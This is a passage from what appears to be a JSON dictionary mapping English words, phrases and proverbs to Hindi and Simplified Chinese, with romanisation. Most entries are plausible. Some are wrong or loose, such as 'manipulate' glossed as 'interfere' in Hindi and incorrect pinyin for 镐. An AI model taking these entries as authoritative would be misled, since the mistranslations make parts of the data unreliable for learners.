                "Hindi": "नष्ट करना (Nashta karna)",
                "Chinese (Simplified)": "破坏 (Pòhuài)"
            },
            "really": {
                "Hindi": "वास्तव में (Vaastav mein)",
                "Chinese (Simplified)": "真的 (Zhēnde)"
            },
            "similar": {
                "Hindi": "सदृश (Sadrish)",
                "Chinese (Simplified)": "相似的 (Xiāngsì de)"
            },
            "entered": {
                "Hindi": "दर्ज किया गया (Darj kiya gaya)",
                "Chinese (Simplified)": "输入 (Shūrù)"
            },
            "pop": {
                "Hindi": "पॉप (Pop)",
                "Chinese (Simplified)": "流行音乐 (Liúxíng yīnyuè)"
            },
            "pin": {
                "Hindi": "पिन (Pin)",
                "Chinese (Simplified)": "别针 (Biézhēn)"
            },
            "lower": {
                "Hindi": "निम्न (Nimn)",
                "Chinese (Simplified)": "较低的 (Jiàodī de)"
            },
            "pajama": {
                "Hindi": "पजामा (Pajaama)",
                "Chinese (Simplified)": "睡裤 (Shuìkù)"
            },
            "grind": {
                "Hindi": "पीसना (Peesna)",
                "Chinese (Simplified)": "磨 (Mó)"
            },
            "desserts": {
                "Hindi": "मिठाईयाँ (Mithaiyaan)",
                "Chinese (Simplified)": "甜点 (Tiándiǎn)"
            },
            "sweets": {
                "Hindi": "मिठाई (Mithai)",
                "Chinese (Simplified)": "糖果 (Tángguǒ)"
            },
            "beggar": {
                "Hindi": "भिखारी (Bhikhaari)",
                "Chinese (Simplified)": "乞丐 (Qǐgài)"
            },
            "Indus Valley": {
                "Hindi": "सिंधु घाटी (Sindhu Ghaati)",
                "Chinese (Simplified)": "印度河流域文明 (Yìndù héliúyù wénmíng)"
            },
            "snacks": {
                "Hindi": "नाश्ता (Naashta)",
                "Chinese (Simplified)": "小吃 (Xiǎochī)"
            },
            "first time": {
                "Hindi": "पहली बार (Pehli baar)",
                "Chinese (Simplified)": "第一次 (Dì yī cì)"
            },
            "last time": {
                "Hindi": "पिछली बार (Pichhli baar)",
                "Chinese (Simplified)": "上次 (Shàngcì)"
            },
            "flirt": {
                "Hindi": "छेड़खानी करना (Chheddkhaani karna)",
                "Chinese (Simplified)": "调情 (Tiáoqíng)"
            },
            "manipulate": {
                "Hindi": "हस्तक्षेप करना (Hastakshep karna)",
                "Chinese (Simplified)": "操纵 (Cāozòng)"
            },
            "i got hate comments": {
                "Hindi": "मुझे नफरत भरे कमेंट मिले (Mujhe nafrat bhare comment mile)",
                "Chinese (Simplified)": "我收到了很多仇恨评论 (Wǒ shōudào le hěnduō chóuhèn pínlùn)"
            },
            "how to learn": {
                "Hindi": "कैसे सीखें (Kaise seekhen)",
                "Chinese (Simplified)": "如何学习 (Rúhé xuéxí)"
            },
            "twice": {
                "Hindi": "दो बार (Do baar)",
                "Chinese (Simplified)": "两次 (Liǎng cì)"
            },
            "list": {
                "Hindi": "सूची (Soochi)",
                "Chinese (Simplified)": "列表 (Lièbiǎo)"
            },
            "tragedy": {
                "Hindi": "त्रासदी (Traasdi)",
                "Chinese (Simplified)": "悲剧 (Bēijù)"
            },
            "flag": {
                "Hindi": "झंडा (Jhanda)",
                "Chinese (Simplified)": "旗帜 (Qízhì)"
            },
            "red flag": {
                "Hindi": "लाल झंडा (Laal jhanda)",
                "Chinese (Simplified)": "红旗 (Hóngqí)"
            },
            "green flag": {
                "Hindi": "हरा झंडा (Hara jhanda)",
                "Chinese (Simplified)": "绿旗 (Lǜqí)"
            },
            "toxic": {
                "Hindi": "विषाक्त (Vishaakt)",
                "Chinese (Simplified)": "有毒的 (Yǒudú de)"
            },
            "no one tells": {
                "Hindi": "कोई नहीं बताता (Koi nahi batata)",
                "Chinese (Simplified)": "没有人说 (Méiyǒu rén shuō)"
            },
            "ground reality": {
                "Hindi": "जमीनी हकीकत (Jamini hakikat)",
                "Chinese (Simplified)": "现实情况 (Xiànshí qíngkuàng)"
            },
            "Megan": {
                "Hindi": "मेगन (Megan)",
                "Chinese (Simplified)": "梅根 (Méigēn)"
            },
            "who it possible": {
                "Hindi": "यह किसके लिए संभव है (Yah kiske liye sambhav hai)",
                "Chinese (Simplified)": "这对谁来说可能 (Duì shéi lái shuō kěnéng)"
            },
            "this it impossible": {
                "Hindi": "यह असंभव है (Yah asambhav hai)",
                "Chinese (Simplified)": "这是不可能的 (Zhè shì bù kěnéng de)"
            },
            "come on let's go": {
                "Hindi": "चलो चलते हैं (Chalo chalte hain)",
                "Chinese (Simplified)": "来吧，我们走吧 (Lái ba, wǒmen zǒu ba)"
            },
            "oh my god": {
                "Hindi": "हे भगवान (He bhagwaan)",
                "Chinese (Simplified)": "哦，我的天哪 (Ó, wǒ de tiān ne)"
            },
            "wow that's so cool": {
                "Hindi": "वाह, यह बहुत अच्छा है (Vah, yah bahut accha hai)",
                "Chinese (Simplified)": "哇，太酷了 (Wā, tài kù le)"
            },
            "she is bride": {
                "Hindi": "वह दुल्हन है (Vah dulhan hai)",
                "Chinese (Simplified)": "她是新娘 (Tā shì xīnniáng)"
            },
            "he is groom": {
                "Hindi": "वह दूल्हा है (Vah dulha hai)",
                "Chinese (Simplified)": "他是新郎 (Tā shì xīnláng)"
            },
            "gate": {
                "Hindi": "गेट (Gate)",
                "Chinese (Simplified)": "大门 (Dàmén)"
            },
            "scene": {
                "Hindi": "दृश्य (Drishya)",
                "Chinese (Simplified)": "场景 (Chǎngjǐng)"
            },
            "situation": {
                "Hindi": "स्थिति (Sthiti)",
                "Chinese (Simplified)": "情况 (Qíngkuàng)"
            },
            "events": {
                "Hindi": "घटनाएँ (Ghatnaen)",
                "Chinese (Simplified)": "事件 (Shìjiàn)"
            },
            "current events": {
                "Hindi": "समाचार (Samaachaar)",
                "Chinese (Simplified)": "时事 (Shíshì)"
            },
            "current affairs": {
                "Hindi": "समाचार (Samaachaar)",
                "Chinese (Simplified)": "时事 (Shíshì)"
            },
            "affair": {
                "Hindi": "चक्कर (Chakkar)",
                "Chinese (Simplified)": "风流韵事 (Fēngliú yùnshì)"
            },
            "process": {
                "Hindi": "प्रक्रिया (Prakriya)",
                "Chinese (Simplified)": "过程 (Guòchéng)"
            },
            "direct": {
                "Hindi": "सीधा (Seedha)",
                "Chinese (Simplified)": "直接的 (Zhíjiē de)"
            },
            "indirect": {
                "Hindi": "अप्रत्यक्ष (Apraatyaksh)",
                "Chinese (Simplified)": "间接的 (Jiànjiē de)"
            },
            "indirectly": {
                "Hindi": "अप्रत्यक्ष रूप से (Apraatyaksh roop se)",
                "Chinese (Simplified)": "间接地 (Jiànjiē de)"
            },
            "directly": {
                "Hindi": "सीधे (Seedhe)",
                "Chinese (Simplified)": "直接地 (Zhíjiē de)"
            },
            "access": {
                "Hindi": "पहुँच (Pauhnch)",
                "Chinese (Simplified)": "访问 (Fǎngwèn)"
            },
            "allow": {
                "Hindi": "अनुमति देना (Anumati dena)",
                "Chinese (Simplified)": "允许 (Yǔnxǔ)"
            },
            "allowed": {
                "Hindi": "अनुमति दी गई (Anumati di gayi)",
                "Chinese (Simplified)": "被允许的 (Bèi yǔnxǔ de)"
            },
            "not allowed": {
                "Hindi": "अनुमति नहीं है (Anumati nahi hai)",
                "Chinese (Simplified)": "不允许 (Bù yǔnxǔ)"
            },
            "quick": {
                "Hindi": "तेज़ (Tez)",
                "Chinese (Simplified)": "快的 (Kuài de)"
            },
            "quicker": {
                "Hindi": "तेज़तर (Teztar)",
                "Chinese (Simplified)": "更快的 (Gèng kuài de)"
            },
            "faster": {
                "Hindi": "तेज़तर (Teztar)",
                "Chinese (Simplified)": "更快的 (Gèng kuài de)"
            },
            "slower": {
                "Hindi": "धीमा (Dheema)",
                "Chinese (Simplified)": "更慢的 (Gèng màn de)"
            },
            "query": {
                "Hindi": "प्रश्न (Prashn)",
                "Chinese (Simplified)": "查询 (Cháxún)"
            },
            "complicated": {
                "Hindi": "जटिल (Jatil)",
                "Chinese (Simplified)": "复杂的 (Fùzá de)"
            },
            "complex": {
                "Hindi": "जटिल (Jatil)",
                "Chinese (Simplified)": "复杂的 (Fùzá de)"
            },
            "deal": {
                "Hindi": "सौदा (Sauda)",
                "Chinese (Simplified)": "交易 (Jiāoyì)"
            },
            "dealing": {
                "Hindi": "सौदा करना (Sauda karna)",
                "Chinese (Simplified)": "交易 (Jiāoyì)"
            },
            "advantage": {
                "Hindi": "लाभ (Laabh)",
                "Chinese (Simplified)": "优势 (Yōushì)"
            },
            "disadvantage": {
                "Hindi": "नुकसान (Nuksaan)",
                "Chinese (Simplified)": "劣势 (Lièshì)"
            },
            "i love to read books.": {
                "Hindi": "मुझे किताबें पढ़ना पसंद है। (Mujhe kitaabein padhna pasand hai.)",
                "Chinese (Simplified)": "我喜欢读书。 (Wǒ xǐhuān dúshū.)"
            },
            "she is a talented artist.": {
                "Hindi": "वह एक प्रतिभाशाली कलाकार है। (Vah ek pratibhāshālī kalākār hai.)",
                "Chinese (Simplified)": "她是一个有才华的艺术家。 (Tā shì yīgè yǒu cáihuá de yìshùjiā.)"
            },
            "he plays guitar very well.": {
                "Hindi": "वह गिटार बहुत अच्छा बजाता है। (Vah gītār bahut acchā bajātā hai.)",
                "Chinese (Simplified)": "他吉他弹得非常好。 (Tā jítā tán de fēicháng hǎo.)"
            },
            "we went to the park yesterday.": {
                "Hindi": "हम कल पार्क गए थे। (Ham kal pārk gaye the.)",
                "Chinese (Simplified)": "我们昨天去了公园。 (Wǒmen zuótiān qùle gōngyuán.)"
            },
            "they are studying for the exam.": {
                "Hindi": "वे परीक्षा की तैयारी कर रहे हैं। (Ve parīkṣā kī taiyārī kar rahe hain.)",
                "Chinese (Simplified)": "他们正在为考试学习。 (Tāmen zhèngzài wèi kǎoshì xuéxí.)"
            },
            "let's go for a walk.": {
                "Hindi": "चलो चलने चलते हैं। (Chalo chalne chalte hain.)",
                "Chinese (Simplified)": "我们去散步吧。 (Wǒmen qù sànbù ba.)"
            },
            "can you help me with this?": {
                "Hindi": "क्या आप मेरी इसमें मदद कर सकते हैं? (Kya āp meri ismein madad kar sakte hain?)",
                "Chinese (Simplified)": "你能帮我这个忙吗？ (Nǐ néng bāng wǒ zhège máng ma?)"
            },
            "i don't like spicy food.": {
                "Hindi": "मुझे मसालेदार खाना पसंद नहीं है। (Mujhe masāledār khānā pasand nahin hai.)",
                "Chinese (Simplified)": "我不喜欢辛辣的食物。 (Wǒ bù xǐhuān xīnlà de shíwù.)"
            },
            "he is a kind and gentle person.": {
                "Hindi": "वह एक दयालु और सौम्य व्यक्ति है। (Vah ek dayālu aur saumya vyakti hai.)",
                "Chinese (Simplified)": "他是一个善良温柔的人。 (Tā shì yīgè shànliáng wēnróu de rén.)"
            },
            "the sky is blue and clear.": {
                "Hindi": "आकाश नीला और साफ है। (Ākāsh nīlā aur sāf hai.)",
                "Chinese (Simplified)": "天空是蓝色而晴朗的。 (Tiānkōng shì lán sè ér qínglǎng de.)"
            },
            "i have a pet cat named Luna.": {
                "Hindi": "मेरे पास लूना नाम की पालतू बिल्ली है। (Mere pās Lūnā nām kī pāltū billi hai.)",
                "Chinese (Simplified)": "我有一只名叫卢娜的宠物猫。 (Wǒ yǒu yī zhī míng jiào Lúnà de chǒngwù māo.)"
            },
            "they are planning a surprise party.": {
                "Hindi": "वे एक सरप्राइज़ पार्टी की योजना बना रहे हैं। (Ve ek surprāiz pārtī kī yojnā banā rahe hain.)",
                "Chinese (Simplified)": "他们正在计划一个惊喜派对。 (Tāmen zhèngzài jìhuà yīgè jīngxǐ pàiduì.)"
            },
            "she is a very intelligent student.": {
                "Hindi": "वह एक बहुत ही बुद्धिमान छात्रा है। (Vah ek bahut hī buddhimān chātrā hai.)",
                "Chinese (Simplified)": "她是一个非常聪明的学生。 (Tā shì yīgè fēicháng cōngmíng de xuéshēng.)"
            },
            "he is a good listener.": {
                "Hindi": "वह एक अच्छा श्रोता है। (Vah ek acchā śrotā hai.)",
                "Chinese (Simplified)": "他是一个好的倾听者。 (Tā shì yīgè hǎo de qīngtīng zhě.)"
            },
            "the early bird catches the worm.": {
                "Hindi": "जल्दी उठने वाले को लाभ होता है। (Jaldī uṭhne vāle ko lābh hotā hai.)",
                "Chinese (Simplified)": "早起的鸟儿有虫吃。 (Zǎoqǐ de niǎo ér yǒu chóng chī.)"
            },
            "don't count your chickens before they hatch.": {
                "Hindi": "अंडे से चूजा निकलने से पहले उसकी गिनती मत करो। (Ande se chooja nikalne se pehle uski ginti mat karo.)",
                "Chinese (Simplified)": "不要高兴得太早。 (Bù yào gāo xìng de tài zǎo.)"
            },
            "practice makes perfect.": {
                "Hindi": "अभ्यास परफेक्ट बनाता है। (Abhyas perfect banata hai.)",
                "Chinese (Simplified)": "熟能生巧。 (Shú néng shēng qiǎo.)"
            },
            "time flies when you're having fun.": {
                "Hindi": "मज़े करते समय समय बहुत जल्दी बीत जाता है। (Maze karte samay samay bahut jaldi beet jata hai.)",
                "Chinese (Simplified)": "快乐的时光总是短暂的。 (Kuài lè de shí guāng zǒng shì duǎn zàn de.)"
            },
            "the grass is always greener on the other side.": {
                "Hindi": "दूरी के दर्शन अच्छे लगते हैं। (Dooree ke darshan acche lagte hain.)",
                "Chinese (Simplified)": "邻家更绿的草。 (Lín jiā gèng lǜ de cǎo.)"
            },
            "actions speak louder than words.": {
                "Hindi": "कर्म ही पूजा है। (Karm hi pooja hai.)",
                "Chinese (Simplified)": "行动胜于言语。 (Xíng dòng shèng yú yán yǔ.)"
            },
            "every cloud has a silver lining.": {
                "Hindi": "हर मुश्किल के बाद आसानी आती है। (Har mushkil ke baad aasani aati hai.)",
                "Chinese (Simplified)": "黑暗中总有一线希望。 (Hēi àn zhōng zǒng yǒu yī xiàn xī wàng.)"
            },
            "it's never too late to learn.": {
                "Hindi": "सीखने के लिए कभी देर नहीं होती। (Seekhne ke liye kabhi der nahi hoti.)",
                "Chinese (Simplified)": "活到老，学到老。 (Huó dào lǎo, xué dào lǎo.)"
            },
            "the pen is mightier than the sword.": {
                "Hindi": "कलम तलवार से ताकतवर होती है। (Kalam talwar se taqatvar hoti hai.)",
                "Chinese (Simplified)": "笔比剑更强大。 (Bǐ bǐ jiàn gèng qiáng dà.)"
            },
            "tutorial": {
                "Hindi": "ट्यूटोरियल (Tutorial)",
                "Chinese (Simplified)": "教程 (Jiào chéng)"
            },
            "wear": {
                "Hindi": "पहनना (Pehnna)",
                "Chinese (Simplified)": "穿 (Chuān)"
            },
            "journey": {
                "Hindi": "यात्रा (Yatra)",
                "Chinese (Simplified)": "旅程 (Lǚ chéng)"
            },
            "journey to the west": {
                "Hindi": "पश्चिम की यात्रा (Pashchim ki yatra)",
                "Chinese (Simplified)": "西游记 (Xī yóu jì)"
            },
            "freedom fighter": {
                "Hindi": "स्वतंत्रता सेनानी (Swatantrata senani)",
                "Chinese (Simplified)": "自由战士 (Zì yóu zhàn shì)"
            },
            "tourist": {
                "Hindi": "पर्यटक (Paryatak)",
                "Chinese (Simplified)": "游客 (Yóu kè)"
            },
            "comedy": {
                "Hindi": "कॉमेडी (Comedy)",
                "Chinese (Simplified)": "喜剧 (Xǐ jù)"
            },
            "comedian": {
                "Hindi": "कॉमेडियन (Comedian)",
                "Chinese (Simplified)": "喜剧演员 (Xǐ jù yǎn yuán)"
            },
            "check it": {
                "Hindi": "देखो (Dekho)",
                "Chinese (Simplified)": "看看 (Kàn kàn)"
            },
            "are you excited": {
                "Hindi": "क्या तुम उत्साहित हो? (Kya tum utsahit ho?)",
                "Chinese (Simplified)": "你兴奋吗？ (Nǐ xīng fèn ma?)"
            },
            "are you not excited": {
                "Hindi": "क्या तुम उत्साहित नहीं हो? (Kya tum utsahit nahi ho?)",
                "Chinese (Simplified)": "你不兴奋吗？ (Nǐ bù xīng fèn ma?)"
            },
            "why are you sad": {
                "Hindi": "तुम उदास क्यों हो? (Tum udaas kyun ho?)",
                "Chinese (Simplified)": "你为什么难过？ (Nǐ wèi shén me nán guò?)"
            },
            "hey come here": {
                "Hindi": "अरे यहाँ आओ (Are yahaan aao)",
                "Chinese (Simplified)": "嘿，过来 (Hēi, guò lái)"
            },
            "come here": {
                "Hindi": "यहाँ आओ (Yahaan aao)",
                "Chinese (Simplified)": "过来 (Guò lái)"
            },
            "go there": {
                "Hindi": "वहाँ जाओ (Vahaan jao)",
                "Chinese (Simplified)": "去那里 (Qù nà lǐ)"
            },
            "stop here": {
                "Hindi": "यहाँ रुक जाओ (Yahaan ruk jao)",
                "Chinese (Simplified)": "停在这里 (Tíng zài zhè lǐ)"
            },
            "stop there": {
                "Hindi": "वहाँ रुक जाओ (Vahaan ruk jao)",
                "Chinese (Simplified)": "停在那里 (Tíng zài nà lǐ)"
            },
            "that's it": {
                "Hindi": "बस इतना ही (Bas itna hi)",
                "Chinese (Simplified)": "就这些 (Jiù zhè xiē)"
            },
            "crisp": {
                "Hindi": "कुरकुरा (Kurkura)",
                "Chinese (Simplified)": "脆的 (Cuì de)"
            },
            "pretty": {
                "Hindi": "सुंदर (Sundar)",
                "Chinese (Simplified)": "漂亮的 (Piào liang de)"
            },
            "suspicious": {
                "Hindi": "संदिग्ध (Sandigdh)",
                "Chinese (Simplified)": "可疑的 (Kě yí de)"
            },
            "psychology": {
                "Hindi": "मनोविज्ञान (Manovigyaan)",
                "Chinese (Simplified)": "心理学 (Xīn lǐ xué)"
            },
            "tax": {
                "Hindi": "कर (Kar)",
                "Chinese (Simplified)": "税 (Shuì)"
            },
            "entropy": {
                "Hindi": "एन्ट्रॉपी (Entropy)",
                "Chinese (Simplified)": "熵 (Shāng)"
            },
            "breed": {
            "Hindi": "नस्ल (Nasl)",
            "Chinese (Simplified)": "品种 (Pǐnzhǒng)"
            },
            "cocoon": {
                "Hindi": "कोया (Koya)",
                "Chinese (Simplified)": "茧 (Jiǎn)"
            },
            "worm": {
                "Hindi": "कीड़ा (Keeda)",
                "Chinese (Simplified)": "虫子 (Chóngzi)"
            },
            "racoon": {
                "Hindi": "रैकून (Raccoon)",
                "Chinese (Simplified)": "浣熊 (Huànxióng)"
            },
            "guaranteed": {
                "Hindi": "गारंटीकृत (Guaranteekrit)",
                "Chinese (Simplified)": "保证的 (Bǎozhèng de)"
            },
            "ad": {
                "Hindi": "विज्ञापन (Vigyapan)",
                "Chinese (Simplified)": "广告 (Guǎnggào)"
            },
            "amazing scene": {
                "Hindi": "अद्भुत दृश्य (Adbhut Drishya)",
                "Chinese (Simplified)": "惊人的场景 (Jīngrén de Chǎngjǐng)"
            },
            "darling": {
                "Hindi": "प्रिय (Priya)",
                "Chinese (Simplified)": "亲爱的 (Qīn'ài de)"
            },
            "pickle": {
                "Hindi": "अचार (Achar)",
                "Chinese (Simplified)": "腌菜 (Yāncài)"
            },
            "chilly": {
                "Hindi": "ठंडा (Thanda)",
                "Chinese (Simplified)": "寒冷的 (Hánlěng de)"
            },
            "butterfly": {
                "Hindi": "तितली (Titli)",
                "Chinese (Simplified)": "蝴蝶 (Húdié)"
            },
            "troops": {
                "Hindi": "सैनिक (Sainik)",
                "Chinese (Simplified)": "部队 (Bùduì)"
            },
            "labor": {
                "Hindi": "मजदूरी (Mazdoori)",
                "Chinese (Simplified)": "劳动 (Láodòng)"
            },
            "raw": {
                "Hindi": "कच्चा (Kaccha)",
                "Chinese (Simplified)": "生的 (Shēng de)"
            },
            "extra": {
                "Hindi": "अतिरिक्त (Atirikt)",
                "Chinese (Simplified)": "额外的 (Éwài de)"
            },
            "cooked": {
                "Hindi": "पका हुआ (Paka Hua)",
                "Chinese (Simplified)": "煮熟的 (Zhǔshú de)"
            },
            "uncontrol": {
                "Hindi": "नियंत्रण से बाहर (Niyantran Se Bahar)",
                "Chinese (Simplified)": "失控 (Shīkòng)"
            },
            "automatic": {
                "Hindi": "स्वचालित (Swachalit)",
                "Chinese (Simplified)": "自动的 (Zìdòng de)"
            },
            "menu": {
                "Hindi": "मेन्यू (Menu)",
                "Chinese (Simplified)": "菜单 (Càidān)"
            },
            "manual": {
                "Hindi": "मैन्युअल (Manual)",
                "Chinese (Simplified)": "手动的 (Shǒudòng de)"
            },
            "custom": {
                "Hindi": "रिवाज (Rivaaj)",
                "Chinese (Simplified)": "习俗 (Xísú)"
            },
            "customize": {
                "Hindi": "अनुकूलित (Anukoolit)",
                "Chinese (Simplified)": "定制 (Dìngzhì)"
            },
            "getting": {
                "Hindi": "प्राप्त करना (Prapt Karna)",
                "Chinese (Simplified)": "获取 (Huòqǔ)"
            },
            "got it": {
                "Hindi": "समझ गया (Samajh Gaya)",
                "Chinese (Simplified)": "明白了 (Míngbái le)"
            },
            "using": {
                "Hindi": "उपयोग करना (Upyog Karna)",
                "Chinese (Simplified)": "使用中 (Shǐyòng zhōng)"
            },
            "used": {
                "Hindi": "प्रयुक्त (Prayukt)",
                "Chinese (Simplified)": "已使用 (Yǐ shǐyòng)"
            },
            "proper": {
                "Hindi": "उचित (Uchit)",
                "Chinese (Simplified)": "适当的 (Shìdàng de)"
            },
            "climb": {
                "Hindi": "चढ़ाई करना (Chadhai Karna)",
                "Chinese (Simplified)": "爬 (Pá)"
            },
            "pickaxe": {
                "Hindi": "कुदाल (Kudal)",
                "Chinese (Simplified)": "镐 (Hào)"
            },
            "hammer": {
                "Hindi": "हथौड़ा (Hathoda)",
                "Chinese (Simplified)": "锤子 (Chuízi)"
            },
            "wrench": {
                "Hindi": "पाना (Pana)",
                "Chinese (Simplified)": "扳手 (Bānshǒu)"
            },
            "built": {
                "Hindi": "निर्मित (Nirmit)",
                "Chinese (Simplified)": "建造的 (Jiànzào de)"
            },
            "looking": {
                "Hindi": "देख रहे (Dekh Rahe)",
                "Chinese (Simplified)": "正在看 (Zhèngzài kàn)"
            },
            "topic": {
                "Hindi": "विषय (Vishay)",
                "Chinese (Simplified)": "话题 (Huàtí)"
            },
            "subject": {
                "Hindi": "विषय (Vishay)",
                "Chinese (Simplified)": "主题 (Zhǔtí)"
            },
            "hypocrisy": {
                "Hindi": "पाखंड (Pakhanda)",
                "Chinese (Simplified)": "虚伪 (Xūwěi)"
            },
            "limit": {
                "Hindi": "सीमा (Seema)",
                "Chinese (Simplified)": "限制 (Xiànzhì)"
            },
            "irony": {
                "Hindi": "विडंबना (Vidambana)",
                "Chinese (Simplified)": "讽刺 (Fěngcì)"
            },
            "limited": {
                "Hindi": "सीमित (Seemit)",
                "Chinese (Simplified)": "有限的 (Yǒuxiàn de)"
            },
            "unlimited": {
                "Hindi": "असीमित (Aseemit)",
                "Chinese (Simplified)": "无限的 (Wúxiàn de)"
            },
            "whistle": {
                "Hindi": "सीटी (seetee)",
                "Chinese (Simplified)": "吹口哨 (chuī kǒushào)"
            },
            "wiggle": {
                "Hindi": "लचकना (lachakna)",
                "Chinese (Simplified)": "摆动 (bǎidòng)"
            },
            "jiggle": {
                "Hindi": "हिलाना (hilaana)",
                "Chinese (Simplified)": "晃动 (huàngdòng)"
            },
            "require": {
                "Hindi": "आवश्यक होना (aavashyak hona)",
                "Chinese (Simplified)": "需要 (xūyào)"
            },
            "requirement": {
                "Hindi": "आवश्यकता (aavashyakta)",
                "Chinese (Simplified)": "要求 (yāoqiú)"
            },
            "course": {
                "Hindi": "पाठ्यक्रम (paathyakram)",
                "Chinese (Simplified)": "课程 (kèchéng)"
            },
            "blow": {
                "Hindi": "फूंक मारना (phoonk maarna)",
                "Chinese (Simplified)": "吹 (chuī)"
            },
            "blowing": {
                "Hindi": "फूंकना (phoonkna)",
                "Chinese (Simplified)": "吹动 (chuī dòng)"
            },
            "soul": {
                "Hindi": "आत्मा (aatma)",
                "Chinese (Simplified)": "灵魂 (línghún)"
            },
            "coal": {
                "Hindi": "कोयला (koyla)",
                "Chinese (Simplified)": "煤炭 (méitàn)"
            },
            "pole": {
                "Hindi": "डंडा (danda)",
                "Chinese (Simplified)": "杆 (gǎn)"
            },
            "slip": {
                "Hindi": "फिसलना (fisalna)",
                "Chinese (Simplified)": "滑倒 (huádǎo)"
            },
            "extinct": {
                "Hindi": "विलुप्त (vilupt)",
                "Chinese (Simplified)": "灭绝 (mièjué)"
            },
            "count": {
                "Hindi": "गिनती करना (ginti karna)",
                "Chinese (Simplified)": "计算 (jìsuàn)"
            },
            "less than": {
                "Hindi": "से कम (se kam)",
                "Chinese (Simplified)": "少于 (shǎoyú)"
            },
            "ethical": {
                "Hindi": "नैतिक (naitik)",
                "Chinese (Simplified)": "伦理的 (lúnlǐ de)"
            },
            "unethical": {
                "Hindi": "अनैतिक (anaitik)",
                "Chinese (Simplified)": "不道德的 (bù dàodé de)"
            },
            "income": {
                "Hindi": "आय (aay)",
                "Chinese (Simplified)": "收入 (shōurù)"
            },
            "salary": {
                "Hindi": "वेतन (vetan)",
                "Chinese (Simplified)": "工资 (gōngzī)"
            },
            "moving": {
                "Hindi": "चलना (chalna)",
                "Chinese (Simplified)": "移动 (yídòng)"
            },
            "moving abroad": {
                "Hindi": "विदेश जाना (videsh jaana)",
                "Chinese (Simplified)": "移居国外 (yíjū guówài)"
            },
            "moved abroad": {
                "Hindi": "विदेश चले गए (videsh chale gaye)",
                "Chinese (Simplified)": "搬到国外 (bān dào guówài)"
            },
            "foundation": {
                "Hindi": "आधार (aadhar)",
                "Chinese (Simplified)": "基础 (jīchǔ)"
            },
            "capital": {
                "Hindi": "पूंजी (poonji)",
                "Chinese (Simplified)": "资本 (zīběn)"
            },
            "capital city": {
                "Hindi": "राजधानी (raajdhaani)",
                "Chinese (Simplified)": "首都 (shǒudū)"
            },
            "library": {
                "Hindi": "पुस्तकालय (pustakalay)",
                "Chinese (Simplified)": "图书馆 (túshūguǎn)"
            },
            "border": {
                "Hindi": "सीमा (seema)",
                "Chinese (Simplified)": "边界 (biānjiè)"
            },
            "dispute": {
                "Hindi": "विवाद (vivad)",
                "Chinese (Simplified)": "争端 (zhēngduān)"
            },
            "come back": {
                "Hindi": "वापस आना (wapas aana)",
                "Chinese (Simplified)": "回来 (huílái)"
            },
            "celebrate": {
                "Hindi": "जश्न मनाना (jashn manana)",
                "Chinese (Simplified)": "庆祝 (qìngzhù)"
            },
            "congrats": {
                "Hindi": "बधाई (badhai)",
                "Chinese (Simplified)": "恭喜 (gōngxǐ)"
            },
            "congratulation": {
                "Hindi": "शुभकामना (shubhkaamna)",
                "Chinese (Simplified)": "祝贺 (zhùhè)"
            },
            "work culture": {
                "Hindi": "कार्य संस्कृति (karya sanskriti)",
                "Chinese (Simplified)": "工作文化 (gōngzuò wénhuà)"
            },
            "drill": {
                "Hindi": "ड्रिल (drill) / अभ्यास (abhyas)",
                "Chinese (Simplified)": "钻孔 (zuānkǒng) / 演练 (yǎnliàn)"
            },
            "free of charge": {
                "Hindi": "निःशुल्क (nishulk)",
                "Chinese (Simplified)": "免费 (miǎnfèi)"
            },
            "sale": {
                "Hindi": "बिक्री (bikri)",
                "Chinese (Simplified)": "销售 (xiāoshòu)"
            },
            "publish": {
                "Hindi": "प्रकाशित करना (prakaashit karna)",
                "Chinese (Simplified)": "出版 (chūbǎn)"
            },
            "publisher": {
                "Hindi": "प्रकाशक (prakaashak)",
                "Chinese (Simplified)": "出版商 (chūbǎn shāng)"
            },
            "bill": {
                "Hindi": "बिल (bill)",
                "Chinese (Simplified)": "账单 (zhàngdān)"
            },
            "partition": {
                "Hindi": "विभाजन (vibhaajan)",
                "Chinese (Simplified)": "分隔 (fēngé)"
            },
            "overview": {
                "Hindi": "सारांश (saaraansh)",
                "Chinese (Simplified)": "概述 (gàishù)"
            },
            "overall": {
                "Hindi": "कुल मिलाकर (kul milakar)",
                "Chinese (Simplified)": "总体 (zǒngtǐ)"
            },
            "mixed": {
                "Hindi": "मिश्रित (mishrit)",
                "Chinese (Simplified)": "混合 (hùnhé)"
            },
            "ethnicity": {
                "Hindi": "जातीयता (jaatiyata)",
                "Chinese (Simplified)": "种族 (zhǒngzú)"
            },
            "ethnic": {
                "Hindi": "जातीय (jaatiya)",
                "Chinese (Simplified)": "民族的 (mínzú de)"
            },
            "university": {
                "Hindi": "विश्वविद्यालय (vishwavidyalay)",
                "Chinese (Simplified)": "大学 (dàxué)"
            },
            "relate": {
                "Hindi": "संबंधित करना (sambandhit karna)",
                "Chinese (Simplified)": "关联 (guānlián)"
            },
            "relatives": {
                "Hindi": "रिश्तेदार (rishtedaar)",
                "Chinese (Simplified)": "亲戚 (qīnqì)"
            },
            "related": {
                "Hindi": "संबंधित (sambandhit)",
                "Chinese (Simplified)": "相关的 (xiāngguān de)"
            },
            "unrelated": {
                "Hindi": "असंबंधित (asambandhit)",
                "Chinese (Simplified)": "无关的 (wúguān de)"
            },
            "copied": {
                "Hindi": "नकल की (nakal ki)",
                "Chinese (Simplified)": "复制的 (fùzhì de)"
            },
            "copying": {
                "Hindi": "नकल करना (nakal karna)",
                "Chinese (Simplified)": "复制 (fùzhì)"
            },
            "known": {
                "Hindi": "ज्ञात (gyaat)",
                "Chinese (Simplified)": "已知的 (yǐzhī de)"
            },
            "unknown": {
                "Hindi": "अज्ञात (agyaat)",
                "Chinese (Simplified)": "未知的 (wèizhī de)"
            },
            "army": {
                "Hindi": "सेना (sena)",
                "Chinese (Simplified)": "军队 (jūnduì)"
            },
            "checkmate": {
                "Hindi": "शह और मात (shah aur maat)",
                "Chinese (Simplified)": "将军 (jiàngjūn)"
            },
            "checkout": {
                "Hindi": "चेकआउट (checkout) / भुगतान (bhugtaan)",
                "Chinese (Simplified)": "结账 (jiézhàng)"
            },
            "yourself": {
                "Hindi": "खुद (khud)",
                "Chinese (Simplified)": "你自己 (nǐ zìjǐ)"
            },
            "wonder": {
                "Hindi": "आश्चर्य (aashcharya)",
                "Chinese (Simplified)": "奇迹 (qíjì) / 想知道 (xiǎng zhīdào)"
            },
            "wondering": {
                "Hindi": "सोच रहा हूँ (soch raha hoon)",
                "Chinese (Simplified)": "在想 (zài xiǎng)"
            },
            "lying": {
